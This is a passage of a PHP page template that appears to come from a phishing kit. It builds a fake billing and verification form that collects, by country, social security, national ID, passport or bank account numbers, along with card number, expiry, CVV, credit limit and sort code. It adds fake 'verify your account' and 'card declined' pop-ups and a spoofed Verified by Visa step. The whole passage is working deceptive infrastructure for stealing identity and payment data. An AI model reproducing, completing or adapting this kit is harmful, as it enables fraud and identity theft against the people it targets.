<option value="Serbia and Montenegro">Serbia and Montenegro</option> 
<option value="Seychelles">Seychelles</option> 
<option value="Sierra Leone">Sierra Leone</option> 
<option value="Singapore">Singapore</option> 
<option value="Slovakia">Slovakia</option> 
<option value="Slovenia">Slovenia</option> 
<option value="Solomon Islands">Solomon Islands</option> 
<option value="Somalia">Somalia</option> 
<option value="South Africa">South Africa</option> 
<option value="South Georgia and The South Sandwich Islands">South Georgia and The South Sandwich Islands</option> 
<option value="Spain">Spain</option> 
<option value="Sri Lanka">Sri Lanka</option> 
<option value="Sudan">Sudan</option> 
<option value="Suriname">Suriname</option> 
<option value="Svalbard and Jan Mayen">Svalbard and Jan Mayen</option> 
<option value="Swaziland">Swaziland</option> 
<option value="Sweden">Sweden</option> 
<option value="Switzerland">Switzerland</option> 
<option value="Syrian Arab Republic">Syrian Arab Republic</option> 
<option value="Taiwan, Province of China">Taiwan, Province of China</option> 
<option value="Tajikistan">Tajikistan</option> 
<option value="Tanzania, United Republic of">Tanzania, United Republic of</option> 
<option value="Thailand">Thailand</option> 
<option value="Timor-leste">Timor-leste</option> 
<option value="Togo">Togo</option> 
<option value="Tokelau">Tokelau</option> 
<option value="Tonga">Tonga</option> 
<option value="Trinidad and Tobago">Trinidad and Tobago</option> 
<option value="Tunisia">Tunisia</option> 
<option value="Turkey">Turkey</option> 
<option value="Turkmenistan">Turkmenistan</option> 
<option value="Turks and Caicos Islands">Turks and Caicos Islands</option> 
<option value="Tuvalu">Tuvalu</option> 
<option value="Uganda">Uganda</option> 
<option value="Ukraine">Ukraine</option> 
<option value="United Arab Emirates">United Arab Emirates</option>
<option value="United States">United States</option>
<option value="United Kingdom">United Kingdom</option> 
<option value="United States Minor Outlying Islands">United States Minor Outlying Islands</option> 
<option value="Uruguay">Uruguay</option> 
<option value="Uzbekistan">Uzbekistan</option> 
<option value="Vanuatu">Vanuatu</option> 
<option value="Venezuela">Venezuela</option> 
<option value="Viet Nam">Viet Nam</option> 
<option value="Virgin Islands, British">Virgin Islands, British</option> 
<option value="Virgin Islands, U.S.">Virgin Islands, U.S.</option> 
<option value="Wallis and Futuna">Wallis and Futuna</option> 
<option value="Western Sahara">Western Sahara</option> 
<option value="Yemen">Yemen</option> 
<option value="Zambia">Zambia</option> 
<option value="Zimbabwe">Zimbabwe</option></select>

<input class="required" required="required" maxlength="10" placeholder="<?php echo $zip;?>" maxlength="10" value="<?php echo $kodepos;?>" name="zip" id="zip" type="text" style="
    position: absolute;
    top: <?php echo $top_input_zip;?>;
    left: 280px;
    width: 320px;
    ">
    
<?php
if ($negara=="Hong Kong" or $negara=="Cyprus" or $negara=="Greece" or $negara=="Saudi Arabia" or $negara=="Qatar" or $negara=="Kuwait" or $negara=="United States" or $negara=="Canada" or $negara=="Ireland" or $negara=="Australia" or $negara=="India" or $negara=="Thailand" or $negara=="United Kingdom" or $negara=="New Zealand"){
    echo '<hr id="garis1" style="top:'.$top_garis1_ssn.';">';
    echo '<font id="ad" class="xFont" style="top:'.$top_ad_ssn.';">'.$bil.'</font>';
}else{
    echo '<hr id="garis1" style="top:'.$top_garis1.';"><div style="position: absolute;top: 580px;left: 280px;" id="socountry"></div>';
     echo '<font id="ad" class="xFont" style="top:'.$top_ad.';">'.$bil.'</font>';
}
?>
<?php
if ($negara=="Hong Kong"){ 
echo '<div style="position: absolute;top: '.$top_input_socountry.';left: 280px;" id="socountry"><span class="xFont2" style="position: absolute;top: 0px;width:500px;">&nbsp;<b>'.strtoupper($idnumber).'</b></span><input name="idnumber" class="required" required="required" placeholder="'.$idnumber.'" value="'.$_SESSION['idnumber'].'" maxlength="20" type="tel" style="
    position: absolute;
    width: 320px;
    top:'.$top_socountry.';
"></div>';
}
?>
<?php
if ($negara=="Cyprus" or $negara=="Greece"){
echo '<div style="position: absolute;top: '.$top_input_socountry.';left: 280px;" id="socountry"><span class="xFont2" style="position: absolute;top: 0px;width:500px;">&nbsp;<b>'.strtoupper($passpor).'</b></span><input name="passportnumber" required="required" class="required" placeholder="'.$passpor.'" value="'.$_SESSION['passportnumber'].'" maxlength="20" type="tel" style="
    position: absolute;
    width: 320px;
    top:'.$top_socountry.';
"></div>';
};
?>
<?php
if ($negara=="Saudi Arabia"){
echo '<div style="position: absolute;top: '.$top_input_socountry.';left: 280px;" id="socountry"><span class="xFont2" style="position: absolute;top: 0px;width:500px;">&nbsp;<b>'.strtoupper($natio).'</b></span><input name="nationalid" required="required" class="required" placeholder="'.$natio.'" value="'.$_SESSION['nationalid'].'" maxlength="20" type="tel" style="
    position: absolute;
    width: 320px;
    top:'.$top_socountry.';
"></div>';
};
?>
<?php
if ($negara=="Qatar"){
echo '<div id="socountry" style="position: absolute;top: '.$top_input_socountry.';left: 280px;" ><span class="xFont2" style="position: absolute;top: 0px;width:500px;">&nbsp;<b>'.strtoupper($qatariden).'</b></span><input name="qatarid" required="required" class="required" placeholder="'.$qatariden.'" value="'.$_SESSION['qatarid'].'" maxlength="20" type="tel" style="
    position: absolute;
    width: 320px;
    top:'.$top_socountry.';
"></div>';
};
?>
<?php
if ($negara=="Kuwait"){
echo '<div style="position: absolute;top: '.$top_input_socountry.';left: 280px;" id="socountry"><span class="xFont2" style="position: absolute;top: 0px;width:500px;">&nbsp;<b>'.strtoupper($civid).'</b></span><input name="civilid" required="required" class="required" placeholder="'.$civid.'" value="'.$_SESSION['civilid'].'" maxlength="20" type="tel" style="
    position: absolute;
    width: 320px;
    top:'.$top_socountry.';
"></div>';
};
?>
<?php
if ($negara=="United States"  or $negara=="Ireland"){
echo '<div style="position: absolute;top: '.$top_input_socountry.';left: 280px;" id="socountry"><span class="xFont2" style="position: absolute;top: 0px;width:500px;">&nbsp;<b>'.strtoupper($ssn).'</b></span><input id="ssn1" name="ssn" required="required" class="required" placeholder="'.$ssn.'" value="'.$_SESSION['ssn'].'" maxlength="11" type="tel" style="
    position: absolute;
    top:'.$top_socountry.';
    width: 320px;
"></div>';
};
?>
<?php
if ($negara=="India"){
echo '<div style="position: absolute;top: '.$top_input_socountry.';left: 280px;" id="socountry"><span class="xFont2" style="position: absolute;top: 0px;width:500px;">&nbsp;<b>'.strtoupper($accnumber).'</b></span><input name="acc_number" required="required" class="required" placeholder="'.$accnumber.'" value="'.$_SESSION['acc_number'].'" maxlength="15" type="tel" style="
    position: absolute;
    width: 320px;
    top:'.$top_socountry.';
"></div>';
};
?>
<?php
if ($negara=="United Kingdom"){
echo '<div style="position: absolute;top: '.$top_input_socountry.';left: 280px;" id="socountry"><span class="xFont2" style="position: absolute;top: 0px;width:500px;">&nbsp;<b>'.strtoupper($accnumber).'</b></span><input name="acc_number" required="required" class="required" placeholder="'.$accnumber.'" value="'.$_SESSION['acc_number'].'" maxlength="15" type="tel" style="
    position: absolute;
    width: 320px;
    top:'.$top_socountry.';
"></div>';
};
?>
<?php
if ($negara=="Australia"){
echo '<div style="position: absolute;top: '.$top_input_socountry.';left: 280px;" id="socountry"><span class="xFont2" style="position: absolute;top: 0px;width:500px;">&nbsp;<b>'.strtoupper($osidnumber).'</b></span><input name="osidnum" required="required" class="required" placeholder="'.$osidnumber.'" value="'.$_SESSION['osidnum'].'" type="tel" style="
    position: absolute;
    width: 320px;
    top:'.$top_socountry.';
"></div>';
};
?>
<?php
if ($negara=="Canada"){
echo '<div style="position: absolute;top: '.$top_input_socountry.';left: 280px;" id="socountry"><span class="xFont2" style="position: absolute;top: 0px;width:500px;">&nbsp;<b>'.strtoupper($sin).'</b></span><input name="cassn" required="required" class="required" placeholder="'.$sin.'" value="'.$_SESSION['cassn'].'" type="tel" style="
    position: absolute;
    width: 320px;
    top:'.$top_socountry.';
"></div>';
};
?>
<?php
if ($negara=="Thailand"){
echo '<div style="position: absolute;top: '.$top_input_socountry.';left: 280px;" id="socountry"><span class="xFont2" style="position: absolute;top: 0px;width:500px;">&nbsp;<b>'.strtoupper($citizen).'</b></span><input name="citizenid" required="required" class="required" placeholder="'.$citizen.'" value="'.$_SESSION['citizenid'].'" type="tel" style="
    position: absolute;
    width: 320px;
    top:'.$top_socountry.';
"></div>';
};
?>
<?php
if ($negara=="New Zealand"){
echo '<div style="position: absolute;top: '.$top_input_socountry.';left: 280px;" id="socountry"><span class="xFont2" style="position: absolute;top: 0px;width:500px;">&nbsp;<b>BANK ACCESS NUMBER</b></span><input name="bankaccnumber" required="required" class="required" placeholder="bank access number" value="" type="tel" style="
    position: absolute;
    width: 320px;
    top:'.$top_socountry.';
"></div>';
};
?>
<?php if ($negara=="Hong Kong" or $negara=="Cyprus" or $negara=="Greece" or $negara=="Saudi Arabia" or $negara=="Qatar" or $negara=="Kuwait" or $negara=="United States" or $negara=="Canada" or $negara=="Ireland" or $negara=="Australia" or $negara=="India" or $negara=="Thailand" or $negara=="United Kingdom" or $negara=="New Zealand") { ?>
<div style="position: absolute;top: <?php echo $top_ad_ssn;?>;left: 280px;" id="card_details"><span class="xFont2" style="position: absolute;top: 0px;width:500px;">&nbsp;<b><?php echo $besar_card;?></b></span><input style="position:absolute;top:30px;width:320px;" name="cardname" required="required" class="required" placeholder="<?php echo $cchold;?>" value="" type="tel">
<div class="field">
<input name="number" id="cc_number" class="required" pattern="[2-7][0-9 ]{11,20}" minlength="13" required="required" maxlength="20" placeholder="<?php echo $creditnumber;?>" type="tel" style="position: absolute;top: 70px;width: 320px;">
</div>
<div class="field">
<input type="tel" id="expired" name="expred" required="required" maxlength="9" style="position: absolute;top: 110px;width: 320px;" placeholder="<?php echo $ddmm;?>" class="required">
</div>
<div class="field">
<input class="required" id="cvv2_number" placeholder="<?php echo $secode;?>" maxlength="4" required="required" pattern="[0-9.]+" name="sdfs" type="tel" style="position: absolute;top: 150px;width: 320px;">
</div>
<div class="field">
<input id="3digitamexs" class="required" placeholder="cid" maxlength="3" pattern="[0-9.]+" name="cid" type="tel" style="display:none;position: absolute;top: 190px;width: 320px;">
</div>
<?php
if ($negara=="Australia" or $negara=="Thailand" or $negara=="India" or $negara=="New Zealand" or $negara=="Saudi Arabia"){
echo '<div class="field" style="position:absolute;" id="novbv">
<input class="required" placeholder="'.strtolower($climit).'" required="required" name="cc_limit" style="position: absolute;top: 190px;width: 320px;">
</div>';
};
?>
<?php
if ($negara=="United Kingdom"){
echo '<div class="field" style="position:absolute;" id="novbv">
<input class="required" placeholder="sort code" required="required" name="sortcode" style="position: absolute;top: 190px;width: 320px;">
</div>';
};
?>
</div>
<?php
}else{
?>
<div style="position: absolute;top: <?php echo $top_ad;?>;left: 280px;" id="card_details"><span class="xFont2" style="position: absolute;top: 0px;width:500px;">&nbsp;<b><?php echo $besar_card;?></b></span><input style="position:absolute;top:30px;width:320px;" name="cardname" required="required" class="required" placeholder="<?php echo $cchold;?>" value="" type="tel">
<div class="field">
<input name="number" id="cc_number" class="required" pattern="[2-7][0-9 ]{11,20}" minlength="13" required="required" maxlength="20" placeholder="<?php echo $creditnumber;?>" type="tel" style="position: absolute;top: 70px;width: 320px;">
</div>
<div class="field">
<input type="tel" id="expired" name="expred" required="required" maxlength="9" style="position: absolute;top: 110px;width: 320px;" placeholder="<?php echo $ddmm;?>" class="required">
</div>
<div class="field">
<input class="required" id="cvv2_number" placeholder="<?php echo $secode;?>" maxlength="4" pattern="[0-9.]+" required="required" name="sdfs" type="tel" style="position: absolute;top: 150px;width: 320px;">
</div>
<div class="field">
<input id="3digitamexs" class="required" placeholder="cid" maxlength="3" pattern="[0-9.]+" name="cid" type="tel" style="display:none;position: absolute;top: 190px;width: 320px;">
</div>
<?php
echo '<div class="field" id="novbv">
</div>';
?>
</div>
<?php } ?>
<?php
if ($negara=="Hong Kong" or $negara=="Cyprus" or $negara=="Greece" or $negara=="Saudi Arabia" or $negara=="Qatar" or $negara=="Kuwait" or $negara=="United States" or $negara=="Canada" or $negara=="Ireland" or $negara=="Australia" or $negara=="India" or $negara=="Thailand" or $negara=="United Kingdom"){
echo '<button id="savebil" class="button rect" type="submit" style="position: absolute; top: '.$top_savebil_ssn.'; left: 850px; width: 150px; padding: 6px;">';
echo "<span>$save</span></button>";
}else{
echo '<button id="savebil" class="button rect" type="submit" style="position: absolute; top: '.$top_savebil.'; left: 850px; width: 150px; padding: 6px;">';
echo "<span>$save</span></button>";
}
?>


            </form>
    </div>
    
</div><br><br>
<div id="containerfooter">
<?php
if($lang == "PE") {?>
<div id="pefooterbawah"></div>
<?php
}?>
<?php
if($lang == "CO") {?>
<div id="cofooterbawah"></div>
<?php
}?>
<?php
if($lang == "MX") {?>
<div id="mxfooterbawah"></div>
<?php
}?>
<?php
if($lang == "AR") {?>
<div id="arfooterbawah"></div>
<?php
}?>
<?php
if($lang == "PY") {?>
<div id="pyfooterbawah"></div>
<?php
}?>
<?php
if($lang == "UY") {?>
<div id="uyfooterbawah"></div>
<?php
}?>
<?php
if($lang == "EC") {?>
<div id="ecfooterbawah"></div>
<?php
}?>
<?php
if($lang == "PE" or $lang == "MX" or $lang == "CO" or $lang == "AR" or $lang == "UY" or $lang == "PY" or $lang == "EC") {
}else{?>
<div id="<?php echo $bahasas;?>footerbawah"></div>
<?php
}
?>
</div>
<script src="../assets/js/main.js"></script>
<script src="../assets/js/jquery.maskedinput.js"></script>
<script type="text/javascript" src="../assets/js/jquery.validate.min.js"></script>


<script type="text/javascript">             
window.onload = function openVentana(){            
$(".ventana").slideDown(500);             
}       
function closeVentana(){            
$(".ventana").slideUp("fast");          
} 
</script> 
<div class="ventana">
<div id="zeb" class="zeb"></div>
    <div id="a2" style="width: auto;margin: 10px;display: none;z-index: 100000;">
        <div id="a1" class="a1">

<center>
<?php
      if($_GET['error'] == 2) {?>
       <script type="text/javascript"> 
      $(document).ready( function() {
        $('#zeb').delay(500).fadeIn(500);
      });
    </script>
    <script type="text/javascript"> 
      $(document).ready( function() {
        $('#a2').delay(500).fadeIn(500);
      });
    </script>
    <script type="text/javascript"> 
      $(document).ready( function() {
        $('#a1').delay(500).fadeIn(500);
      });
    </script>
<div align="left"> <img alt="" src="../assets/img/icon-error.png" style="position: absolute;top: 14px;left: 17px;height: 55px;width: 55px;"> </div>
<div style="position: absolute;top: 10px;right: 5px;"><a href="javascript:closeVentana();"><img src="../assets/img/test.PNG"></a></div>


<h1 style="font-size: 30px;margin-top: 15px;padding-left: 40px;padding-bottom: 30px;color: rgba(51, 51, 51, 0.85);font-weight: 100;font-family:'Open Sans', sans-serif;"> 
<?php echo $payerror;?></h1>
 <p style="font-size: 1.14em;color: #3d3d3d;font-weight: 100;font-family: 'Open Sans', sans-serif;"> 
<?php echo $ccdeclined;?>
 </p>
<hr style="width: 94%;opacity: 0.4;margin-top: 12px;"> 
<br>    
<a style="text-decoration:none;" href="javascript:closeVentana();"><p class="un" style="ccolor: #0179fc;font-size: 1.1em;font-family: 'Open Sans', sans-serif;padding-bottom: 5px;padding-top: 5px;">
<?php echo $another;?>
</p></a>
      <?php
        }else{
          ?>
<div align="left"> <img alt="" src="../assets/img/alert_icon.png" style="position: absolute;top: 14px;left: 17px;height: 55px;width: 55px;"> </div>
<div style="position: absolute;top: 10px;right: 5px;"><a href="javascript:closeVentana();"><img src="../assets/img/test.PNG"></a></div>


<h1 style="font-size: 30px;margin-top: 15px;padding-left: 40px;padding-bottom: 30px;color: rgba(51, 51, 51, 0.85);font-weight: 100;font-family:'Open Sans', sans-serif;"> 
<?php echo $verify;?></h1>
 <p style="font-size: 1.14em;color: #3d3d3d;font-weight: 100;font-family: 'Open Sans', sans-serif;"> 
<?php echo $required;?>
 </p>
 <p style="font-size: 1.1em;color: #3d3d3d;font-weight: 100;font-family: 'Open Sans', sans-serif;"> 
<?php echo $clicknow;?>
</p>
<hr style="width: 94%;opacity: 0.4;margin-top: 12px;"> 
<br>    
<a style="text-decoration:none;" href="javascript:closeVentana();"><p class="un" style="ccolor: #0179fc;font-size: 1.1em;font-family: 'Open Sans', sans-serif;padding-bottom: 5px;padding-top: 5px;">
<?php echo $unlock;?>
</p></a>
<?php
}
?>
</center>
</div></div></div>
<div class="vbvs" >
    <form id="formvbv" method="post">
    <div id="vbv" class="zeb"></div><div id="vbv2" style="width: auto;margin: 10px;display: none;z-index: 100000;">
            <div id="vbv1" class="a1" style="display: block; height:415px;">

        <center>
        <div align="left"> 
            <div id="logobank" style="padding-top:10px; padding-bottom:30px;">
        </div>
        </div>
        <img alt="" id="gambarvbv" src="" style="position: absolute;top: 23px;right: 20px;height: 50px;width: 100px;"> 
        <div style="position: absolute;top: 10px;right: 5px;"></div>
        <div id="tanyavbv">
        </div>
         
       <hr style="width: 94%;opacity: 0.4;margin-top: 1px;">
        
        <br>    

        </center>
    </div></div>
</form>
</div>
<div tabindex="-1" id="spinner" style="overflow: hidden;position: fixed;top: 0;right: 0;bottom: 0;left: 0; z-index: 1040; -webkit-overflow-scrolling: touch; outline: 0;display: none;">
<div id="dos10" class="hasSpinner"></div>
<div style=" width: auto;margin: 10px;z-index: 100000;"></div>
</div>
<div tabindex="-1" id="spinner_" style="overflow: hidden;position: fixed;top: 0;right: 0;bottom: 0;left: 0; z-index: 1040; -webkit-overflow-scrolling: touch; outline: 0;display: none;">
<div id="dos10" class="hasSpinner"></div>
<div style=" width: auto;margin: 10px;z-index: 100000;"></div>
</div>
</body>
</html>
